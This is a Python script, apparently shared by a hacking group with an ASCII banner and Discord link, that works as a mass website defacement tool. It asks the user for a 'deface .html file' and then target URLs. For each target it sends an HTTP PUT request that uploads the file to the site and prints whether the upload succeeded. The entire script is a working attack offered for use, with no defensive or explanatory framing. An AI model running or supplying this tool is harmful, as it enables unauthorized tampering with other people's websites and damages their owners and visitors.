#-*- coding: utf-8 -*-

try:
   import requests
   import os.path
   import sys
   import os
   import random
except ImportError:
   exit("install requests and try again ...")
os.system("clear")

red    = "\033[31m"

blue   = "\033[34m"

bold   = "\033[1m"

reset  = "\033[0m"

green  = "\033[32m"

yellow = "\033[33m"

colors = [

    "\033[38;5;226m",

    "\033[38;5;227m",

    "\033[38;5;229m",

    "\033[38;5;230m",

    "\033[38;5;190m",

    "\033[38;5;191m",

    "\033[38;5;220m",

    "\033[38;5;221m",

    "\033[38;5;142m",

    "\033[38;5;214m",

]

color1, color2, color3, color4, color5 = random.sample(colors, 5)


banner = f"""
\033[32m  .----------------.  .----------------.  .----------------.  .-----------------. .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |      ___     | || |     ____     | || |    ___       | || | ____  _____  | || |     ___      | |
| |     |  _|    | || |   .'    `.   | || |  .' _ '.     | || ||_   \|_   _| | || |    |_  |     | |
| |     | |      | || |  /  .--.  \  | || |  | (_) '___  | || |  |   \ | |   | || |      | |     | |
| |     | |      | || |  | |    | |  | || |  .`___'/ _/  | || |  | |\ \| |   | || |      | |     | |
| |     | |_     | || |  \  `--'  /  | || | | (___)  \_  | || | _| |_\   |_  | || |     _| |     | |
| |     |___|    | || |   `.____.'   | || | `._____.\__| | || ||_____|\____| | || |    |___|     | |
| |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 

                    
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\t

  \033[33m[♥\]Tool author  : O&N

   [♥\]Discord     : https://discord.gg/teHyE9Tgq7\t
   
\033[32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

                    
                   \t"""

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(tetew):
    ipt = input(tetew)
    return str(ipt)

def aox(script, target_url):
    op = open(script, "r").read()
    s = requests.Session()
    try:
        site = target_url.strip()
        if not site.startswith("http://"):
            site = "http://" + site
        req = s.put(site + "/" + script, data=op)
        if req.status_code > 200 or req.status_code >= 250:
            print(m + ">" + b + " FAILED" + b + " %s/%s" % (site, script))
        else:
            print(m + ">" + h + " UPLOADED" + h + " %s/%s" % (site, script))
    except requests.exceptions.RequestException:
        print(m + ">" + b + " FAILED" + b + " %s" % target_url)

def main(__bn__):
    print(__bn__)
    while True:
        try:
            a = x(f"\033[33mEnter your deface .html file: \t")
            if not os.path.isfile(a):
                print("File '%s' not found" % a)
                continue
            else:
                break
        except KeyboardInterrupt:
            print()
            exit()

    while True:
        target_url = x(f"\033[33mEnter the target website URL (or press 'q' to quit): \t")
        if target_url.lower() == 'q':
            break
        aox(a, target_url)
   
if __name__ == "__main__":
    main(banner)
